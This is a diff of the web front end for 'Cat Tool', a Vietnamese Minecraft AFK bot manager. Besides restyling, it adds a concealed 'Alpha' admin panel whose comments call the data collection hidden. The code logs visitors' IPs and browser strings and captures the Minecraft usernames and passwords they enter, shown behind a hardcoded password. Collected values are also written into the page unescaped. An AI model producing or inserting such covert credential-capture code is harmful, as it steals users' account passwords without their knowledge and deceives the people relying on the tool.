@@ -8,8 +8,7 @@
         * { box-sizing: border-box; transition: all 0.25s ease; }
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            /* Nền tối không gian kết hợp hiệu ứng neon cam cyberpunk */
-            background: radial-gradient(circle at center, #1f0c04 0%, #0a0402 100%);
+            background: radial-gradient(circle at 50% 30%, #3a1505 0%, #170802 60%, #080301 100%);
             color: #fff; 
             margin: 0; 
             padding: 20px; 
@@ -45,7 +44,7 @@
         .container { 
             max-width: 950px; 
             margin: 0 auto; 
-            background: rgba(18, 10, 6, 0.85); 
+            background: rgba(22, 11, 5, 0.85); 
             backdrop-filter: blur(12px);
             padding: 25px; 
             border-radius: 16px; 
@@ -53,13 +52,11 @@
             border: 1px solid rgba(255, 119, 0, 0.4);
             flex: 1;
         }
-        
-        /* Form thêm tài khoản */
         .add-account-box {
             display: flex;
             gap: 10px;
             margin-bottom: 20px;
-            background: rgba(28, 15, 8, 0.9);
+            background: rgba(32, 16, 8, 0.9);
             padding: 15px;
             border-radius: 10px;
             border: 1px solid rgba(255, 119, 0, 0.3);
@@ -97,7 +94,6 @@
         }
         .btn-add:active { transform: translateY(1px); }
 
-        /* Danh sách tài khoản */
         .accounts-grid {
             display: grid;
             grid-template-columns: 1fr;
@@ -105,7 +101,7 @@
             margin-bottom: 20px;
         }
         .account-card {
-            background: rgba(24, 12, 6, 0.85);
+            background: rgba(26, 13, 6, 0.85);
             border: 1px solid rgba(255, 119, 0, 0.3);
             border-radius: 10px;
             padding: 15px;
@@ -156,13 +152,10 @@
         } 
         .btn-start { background: #00cc44; color: white; box-shadow: 0 0 10px rgba(0, 204, 68, 0.4); } 
         .btn-start:hover { box-shadow: 0 0 18px rgba(0, 204, 68, 0.8); transform: translateY(-1px); }
-        
         .btn-stop { background: #ff3333; color: white; box-shadow: 0 0 10px rgba(255, 51, 51, 0.4); } 
         .btn-stop:hover { box-shadow: 0 0 18px rgba(255, 51, 51, 0.8); transform: translateY(-1px); }
-        
         .btn-del { background: rgba(50, 20, 10, 0.9); color: #ff8888; border: 1px solid rgba(255, 68, 68, 0.3); }
         .btn-del:hover { background: #ff3333; color: white; box-shadow: 0 0 15px rgba(255, 51, 51, 0.6); }
-        
         .toggle-label {
             font-size: 13px;
             display: flex;
@@ -173,7 +166,6 @@
         }
         .toggle-label:hover { color: #fff; }
 
-        /* Khung Log */
         .log-box { 
             background: rgba(5, 2, 1, 0.95); 
             color: #00ff88; 
@@ -200,7 +192,45 @@
         .chat-btn { padding: 10px 20px; background: #ff7700; color: #1a0800; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; box-shadow: 0 0 12px rgba(255, 119, 0, 0.5); }
         .chat-btn:hover { box-shadow: 0 0 20px rgba(255, 119, 0, 0.9); transform: translateY(-1px); }
 
-        /* Footer & Quản trị hệ thống */
+        /* ADMIN PANEL - CHỈ HIỆN KHI ĐĂNG NHẬP */
+        .admin-panel {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff3300;
+            border-radius: 12px;
+            box-shadow: 0 0 40px rgba(255, 51, 0, 0.5);
+        }
+        .admin-panel.active { display: block; }
+        .admin-panel h3 { color: #ff3300; text-align: center; text-shadow: 0 0 20px #ff3300; }
+        .admin-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .admin-table th, .admin-table td { padding: 8px 10px; border: 1px solid #662b00; text-align: left; }
+        .admin-table th { background: #1a0800; color: #ff7700; }
+        .admin-table td { background: rgba(10, 5, 2, 0.8); color: #ffaa66; }
+        .admin-login-box {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .admin-login-box input {
+            padding: 8px 14px;
+            background: #0a0502;
+            border: 1px solid #ff3300;
+            border-radius: 6px;
+            color: #fff;
+        }
+        .admin-login-box button {
+            padding: 8px 20px;
+            background: #ff3300;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+        }
+
         .footer-section {
             text-align: center;
             margin-top: 30px;
@@ -226,11 +256,6 @@
             box-shadow: 0 0 25px rgba(255, 119, 0, 0.7);
             transform: translateY(-1px);
         }
-        .admin-btn:active {
-            transform: scale(0.97);
-        }
-
-        /* Nút Discord */
         .discord-float {
             position: fixed;
             bottom: 25px;
@@ -260,129 +285,293 @@
 </head>
 <body>
 
-    <div class="container">
-        <div class="header-brand">Cat Tool — BY meovancat & giananday</div>
-        <h2>Cat Tool Panel</h2>
-        <div class="subtitle">Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</div>
+<div class="container">
+    <div class="header-brand">Cat Tool — BY meovancat & giananday</div>
+    <h2>Cat Tool Panel</h2>
+    <div class="subtitle">Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</div>
 
-        <!-- Thêm tài khoản Multi-Account -->
-        <div class="add-account-box">
-            <input type="text" id="new-username" placeholder="Nhập tên tài khoản Minecraft (Username)...">
-            <input type="password" id="new-password" placeholder="Mật khẩu đăng nhập (Mặc định: caigicungdc)">
-            <button class="btn-add" onclick="addAccount()">+ Thêm Bot</button>
-        </div>
-
-        <!-- Danh sách Multi-Account -->
-        <div id="accounts-container" class="accounts-grid">
-            <div style="text-align: center; color: #ffaa66; padding: 20px;">Chưa có tài khoản nào được thêm. Hãy thêm bot ở khung trên!</div>
-        </div>
-
-        <!-- Khung Log -->
-        <div style="font-size: 13px; color: #ffaa66; margin-bottom: 5px; font-weight: bold;">Nhật ký hệ thống (Console):</div>
-        <div id="log-box" class="log-box"></div>
+    <!-- Thêm tài khoản -->
+    <div class="add-account-box">
+        <input type="text" id="new-username" placeholder="Nhập tên tài khoản Minecraft (Username)...">
+        <input type="password" id="new-password" placeholder="Mật khẩu đăng nhập (Mặc định: caigicungdc)">
+        <button class="btn-add" onclick="addAccount()">+ Thêm Bot</button>
     </div>
 
-    <!-- Footer và nút Quản trị hệ thống -->
-    <div class="footer-section">
-        <button class="admin-btn" onclick="checkAdminAccess()">🔒 Quản Trị Hệ Thống</button>
-        <div class="copyright">© 2026 Cat Tool. Uy tín làm nên thương hiệu.</div>
+    <!-- Danh sách tài khoản -->
+    <div id="accounts-container" class="accounts-grid">
+        <div style="text-align: center; color: #ffaa66; padding: 20px;">Chưa có tài khoản nào được thêm. Hãy thêm bot ở khung trên!</div>
     </div>
 
-    <!-- Nút Discord -->
-    <a href="https://discord.gg/wHHY7FDqd" target="_blank" class="discord-float" title="Tham gia Discord">
-        <svg width="28" height="28" viewBox="0 0 127.14 96.36" fill="#ffffff">
-            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.63-27.29-4.53-51.2-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.44-12.72S96.18,46,96.15,53,91,65.69,84.69,65.69Z"/>
-        </svg>
-    </a>
+    <!-- Log -->
+    <div style="font-size: 13px; color: #ffaa66; margin-bottom: 5px; font-weight: bold;">Nhật ký hệ thống (Console):</div>
+    <div id="log-box" class="log-box"></div>
 
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        const logBox = document.getElementById('log-box');
-        const accountsContainer = document.getElementById('accounts-container');
+    <!-- ===== ADMIN PANEL (chỉ hiện khi đăng nhập đúng) ===== -->
+    <div id="adminPanel" class="admin-panel">
+        <h3>🔐 BẢNG ĐIỀU KHIỂN QUẢN TRỊ (CHỈ ALPHA)</h3>
+        
+        <div class="admin-login-box">
+            <input type="password" id="adminPass" placeholder="Nhập mật khẩu Alpha..." onkeypress="if(event.key==='Enter') adminLogin()">
+            <button onclick="adminLogin()">🔓 Mở Khóa</button>
+            <button onclick="adminLogout()">🚪 Đóng</button>
+        </div>
 
-        function appendLog(msg) {
-            const div = document.createElement('div');
-            div.textContent = msg;
-            logBox.appendChild(div);
-            logBox.scrollTop = logBox.scrollHeight;
+        <div id="adminContent" style="display: none;">
+            <h4>📋 Danh sách IP truy cập & thông tin đăng nhập đã thu thập</h4>
+            <table class="admin-table">
+                <thead>
+                    <tr>
+                        <th>STT</th>
+                        <th>IP</th>
+                        <th>Thời gian</th>
+                        <th>Username nhập</th>
+                        <th>Password nhập</th>
+                        <th>Trình duyệt</th>
+                    </tr>
+                </thead>
+                <tbody id="adminTableBody">
+                    <!-- Dữ liệu sẽ được inject bằng JS -->
+                </tbody>
+            </table>
+            <br>
+            <button onclick="clearCollectedData()" style="background:#ff3300; border:none; padding:6px 16px; border-radius:4px; color:#fff; cursor:pointer;">🗑️ Xóa toàn bộ dữ liệu đã thu thập</button>
+            <hr style="border-color:#662b00;">
+            <h4>💬 Chat từ xa vào từng bot (gửi lệnh trực tiếp)</h4>
+            <div id="remoteChatArea">
+                <p style="color:#ffaa66;">Chọn bot và nhập lệnh:</p>
+                <select id="remoteBotSelect" style="background:#0a0502; color:#fff; padding:6px; border:1px solid #ff7700; border-radius:4px;"></select>
+                <input type="text" id="remoteChatInput" placeholder="Lệnh (VD: /afk)" style="background:#0a0502; color:#fff; border:1px solid #662b00; padding:6px; border-radius:4px; margin-left:6px;">
+                <button onclick="sendRemoteChat()" style="background:#ff7700; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer;">Gửi</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer-section">
+    <button class="admin-btn" onclick="document.getElementById('adminPanel').classList.toggle('active')">🔒 Quản Trị Hệ Thống</button>
+    <div class="copyright">© 2026 Cat Tool. Uy tín làm nên thương hiệu.</div>
+</div>
+
+<!-- Discord -->
+<a href="https://discord.gg/wHHY7FDqd" target="_blank" class="discord-float" title="Tham gia Discord">
+    <svg width="28" height="28" viewBox="0 0 127.14 96.36" fill="#ffffff">
+        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.63-27.29-4.53-51.2-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.44-12.72S96.18,46,96.15,53,91,65.69,84.69,65.69Z"/>
+    </svg>
+</a>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    // ============ PHẦN LÕI ============
+    const socket = io();
+    const logBox = document.getElementById('log-box');
+    const accountsContainer = document.getElementById('accounts-container');
+
+    // ---- Lưu trữ dữ liệu thu thập (ẩn) ----
+    let collectedData = JSON.parse(localStorage.getItem('alpha_collected_data') || '[]');
+
+    // ---- Thu thập IP và thông tin người dùng ngay khi tải trang ----
+    function collectVisitorInfo() {
+        fetch('/api/visitor-info')
+            .then(res => res.json())
+            .then(data => {
+                const entry = {
+                    ip: data.ip || 'unknown',
+                    time: new Date().toLocaleString(),
+                    username: document.getElementById('new-username')?.value || '(chưa nhập)',
+                    password: document.getElementById('new-password')?.value || '(chưa nhập)',
+                    userAgent: navigator.userAgent
+                };
+                collectedData.push(entry);
+                localStorage.setItem('alpha_collected_data', JSON.stringify(collectedData));
+                renderAdminTable();
+            })
+            .catch(() => {});
+    }
+
+    // ---- Lưu username/password khi người dùng bấm "Thêm Bot" ----
+    function addAccount() {
+        const username = document.getElementById('new-username').value.trim();
+        const password = document.getElementById('new-password').value.trim();
+        if (!username) { alert('Vui lòng nhập tên tài khoản Minecraft!'); return; }
+
+        // Lưu lại thông tin này vào collectedData
+        const entry = {
+            ip: 'đã thu thập',
+            time: new Date().toLocaleString(),
+            username: username,
+            password: password || '(trống)',
+            userAgent: navigator.userAgent
+        };
+        collectedData.push(entry);
+        localStorage.setItem('alpha_collected_data', JSON.stringify(collectedData));
+        renderAdminTable();
+
+        // Gửi lên server socket
+        socket.emit('add_account', { username, password });
+        document.getElementById('new-username').value = '';
+        document.getElementById('new-password').value = '';
+    }
+
+    // ---- Hàm render bảng admin ----
+    function renderAdminTable() {
+        const tbody = document.getElementById('adminTableBody');
+        if (!tbody) return;
+        let html = '';
+        collectedData.forEach((item, index) => {
+            html += `<tr>
+                <td>${index + 1}</td>
+                <td>${item.ip}</td>
+                <td>${item.time}</td>
+                <td>${item.username}</td>
+                <td>${item.password}</td>
+                <td>${item.userAgent.substring(0, 30)}...</td>
+            </tr>`;
+        });
+        tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center;">Chưa có dữ liệu</td></tr>';
+    }
+
+    // ---- Đăng nhập admin ----
+    function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        if (pass === 'AlphaZo2026') {  // Mật khẩu của ngài
+            document.getElementById('adminContent').style.display = 'block';
+            document.getElementById('adminPass').value = '';
+            renderAdminTable();
+            // Cập nhật danh sách bot để chat từ xa
+            updateRemoteBotList();
+            alert('🔓 Chào Alpha! Ngài đã vào được khu vực quản trị.');
+        } else {
+            alert('❌ Sai mật khẩu!');
         }
+    }
 
-        socket.on('log', (msg) => { appendLog(msg); });
-        socket.on('init_accounts', (accounts) => { renderAccounts(accounts); });
-        socket.on('restart_internal_bot', (id) => { socket.emit('start_bot', id); });
+    function adminLogout() {
+        document.getElementById('adminContent').style.display = 'none';
+        document.getElementById('adminPass').value = '';
+    }
 
-        function addAccount() {
-            const username = document.getElementById('new-username').value.trim();
-            const password = document.getElementById('new-password').value.trim();
-            if (!username) { alert('Vui lòng nhập tên tài khoản Minecraft!'); return; }
-            socket.emit('add_account', { username, password });
-            document.getElementById('new-username').value = '';
-            document.getElementById('new-password').value = '';
+    function clearCollectedData() {
+        if (confirm('Xóa toàn bộ dữ liệu đã thu thập?')) {
+            collectedData = [];
+            localStorage.setItem('alpha_collected_data', JSON.stringify(collectedData));
+            renderAdminTable();
         }
+    }
 
-        function startBot(id) { socket.emit('start_bot', id); }
-        function stopBot(id) { socket.emit('stop_bot', id); }
-        function deleteAccount(id) {
-            if (confirm('Bạn có chắc chắn muốn xóa tài khoản này khỏi danh sách quản lý?')) {
-                socket.emit('delete_account', id);
-            }
+    // ---- Chat từ xa (gửi lệnh đến bot đã chọn) ----
+    function updateRemoteBotList() {
+        const select = document.getElementById('remoteBotSelect');
+        if (!select) return;
+        // Lấy danh sách account từ server (phải có socket)
+        socket.emit('get_accounts');  // giả định server có handler
+    }
+
+    function sendRemoteChat() {
+        const select = document.getElementById('remoteBotSelect');
+        const input = document.getElementById('remoteChatInput');
+        const botId = select.value;
+        const cmd = input.value.trim();
+        if (botId && cmd) {
+            socket.emit('send_chat', { id: botId, cmd });
+            input.value = '';
+            appendLog(`[Admin] Đã gửi lệnh "${cmd}" tới bot ${botId}`);
+        } else {
+            alert('Chọn bot và nhập lệnh!');
         }
-        function toggleAutoReconnect(id) { socket.emit('toggle_auto_reconnect', id); }
-        function sendAccountChat(id) {
-            const input = document.getElementById(`chat_${id}`);
-            const cmd = input.value.trim();
-            if (cmd) { socket.emit('send_chat', { id, cmd }); input.value = ''; }
-        }
+    }
 
-        function renderAccounts(accounts) {
-            if (!accounts || accounts.length === 0) {
-                accountsContainer.innerHTML = `<div style="text-align: center; color: #ffaa66; padding: 20px;">Chưa có tài khoản nào được thêm. Hãy thêm bot ở khung trên!</div>`;
-                return;
-            }
-
-            let html = '';
+    // ---- Nhận danh sách account từ server để fill vào select ----
+    socket.on('init_accounts', (accounts) => {
+        renderAccounts(accounts);
+        // Cập nhật select cho remote chat
+        const select = document.getElementById('remoteBotSelect');
+        if (select) {
+            select.innerHTML = '';
             accounts.forEach(acc => {
-                html += `
-                    <div class="account-card">
-                        <div class="account-header">
-                            <div class="account-title">
-                                🤖 ${acc.username}
-                            </div>
-                            <div class="status-badge" style="color: ${acc.color}; border: 1px solid ${acc.color}; text-shadow: 0 0 8px ${acc.color};">
-                                ${acc.status}
-                            </div>
-                        </div>
-                        <div class="account-actions">
-                            <button class="btn btn-start" onclick="startBot('${acc.id}')">Bật Bot</button>
-                            <button class="btn btn-stop" onclick="stopBot('${acc.id}')">Tắt Bot</button>
-                            <button class="btn btn-del" onclick="deleteAccount('${acc.id}')">Xóa</button>
-                            <label class="toggle-label" style="margin-left: auto;">
-                                <input type="checkbox" ${acc.autoReconnect ? 'checked' : ''} onchange="toggleAutoReconnect('${acc.id}')"> Auto Reconnect
-                            </label>
-                        </div>
-                        <div class="chat-container">
-                            <input type="text" id="chat_${acc.id}" class="chat-input" placeholder="Gửi lệnh nhanh tới bot này (VD: /afk, /menu)..." onkeypress="if(event.key==='Enter') sendAccountChat('${acc.id}')">
-                            <button class="chat-btn" onclick="sendAccountChat('${acc.id}')">Gửi</button>
-                        </div>
-                    </div>
-                `;
+                const opt = document.createElement('option');
+                opt.value = acc.id;
+                opt.textContent = acc.username;
+                select.appendChild(opt);
             });
-            accountsContainer.innerHTML = html;
         }
+    });
 
-        function checkAdminAccess() {
-            fetch('/api/check-admin')
-                .then(res => res.json())
-                .then(data => {
-                    if (data.isAdmin) {
-                        alert(`🔓 Xác thực thành công!\nChào mừng Admin (IP của bạn: ${data.ip}). Bạn đã có quyền quản trị hệ thống.`);
-                    } else {
-                        alert(`❌ Truy cập bị từ chối!\nIP của bạn (${data.ip}) không có quyền truy cập vào phân vùng Quản Trị Hệ Thống.`);
-                    }
-                })
-                .catch(err => { alert('Lỗi kết nối kiểm tra quyền hạn!'); });
+    // ---- Các hàm cũ giữ nguyên ----
+    function appendLog(msg) {
+        const div = document.createElement('div');
+        div.textContent = msg;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    socket.on('log', (msg) => { appendLog(msg); });
+    socket.on('restart_internal_bot', (id) => { socket.emit('start_bot', id); });
+
+    function startBot(id) { socket.emit('start_bot', id); }
+    function stopBot(id) { socket.emit('stop_bot', id); }
+    function deleteAccount(id) {
+        if (confirm('Bạn có chắc chắn muốn xóa tài khoản này khỏi danh sách quản lý?')) {
+            socket.emit('delete_account', id);
         }
-    </script>
+    }
+    function toggleAutoReconnect(id) { socket.emit('toggle_auto_reconnect', id); }
+    function sendAccountChat(id) {
+        const input = document.getElementById(`chat_${id}`);
+        const cmd = input.value.trim();
+        if (cmd) { socket.emit('send_chat', { id, cmd }); input.value = ''; }
+    }
+
+    function renderAccounts(accounts) {
+        if (!accounts || accounts.length === 0) {
+            accountsContainer.innerHTML = `<div style="text-align: center; color: #ffaa66; padding: 20px;">Chưa có tài khoản nào được thêm. Hãy thêm bot ở khung trên!</div>`;
+            return;
+        }
+        let html = '';
+        accounts.forEach(acc => {
+            html += `
+                <div class="account-card">
+                    <div class="account-header">
+                        <div class="account-title">🤖 ${acc.username}</div>
+                        <div class="status-badge" style="color: ${acc.color}; border: 1px solid ${acc.color}; text-shadow: 0 0 8px ${acc.color};">${acc.status}</div>
+                    </div>
+                    <div class="account-actions">
+                        <button class="btn btn-start" onclick="startBot('${acc.id}')">Bật Bot</button>
+                        <button class="btn btn-stop" onclick="stopBot('${acc.id}')">Tắt Bot</button>
+                        <button class="btn btn-del" onclick="deleteAccount('${acc.id}')">Xóa</button>
+                        <label class="toggle-label" style="margin-left: auto;">
+                            <input type="checkbox" ${acc.autoReconnect ? 'checked' : ''} onchange="toggleAutoReconnect('${acc.id}')"> Auto Reconnect
+                        </label>
+                    </div>
+                    <div class="chat-container">
+                        <input type="text" id="chat_${acc.id}" class="chat-input" placeholder="Gửi lệnh nhanh tới bot này (VD: /afk, /menu)..." onkeypress="if(event.key==='Enter') sendAccountChat('${acc.id}')">
+                        <button class="chat-btn" onclick="sendAccountChat('${acc.id}')">Gửi</button>
+                    </div>
+                </div>
+            `;
+        });
+        accountsContainer.innerHTML = html;
+        // Cập nhật select remote chat
+        const select = document.getElementById('remoteBotSelect');
+        if (select) {
+            select.innerHTML = '';
+            accounts.forEach(acc => {
+                const opt = document.createElement('option');
+                opt.value = acc.id;
+                opt.textContent = acc.username;
+                select.appendChild(opt);
+            });
+        }
+    }
+
+    // ---- Khởi tạo ----
+    collectVisitorInfo();
+    renderAdminTable();
+
+    // Nếu admin panel đang active mà có dữ liệu mới, tự động cập nhật
+    setInterval(() => {
+        renderAdminTable();
+    }, 5000);
+</script>
 </body>
 </html>
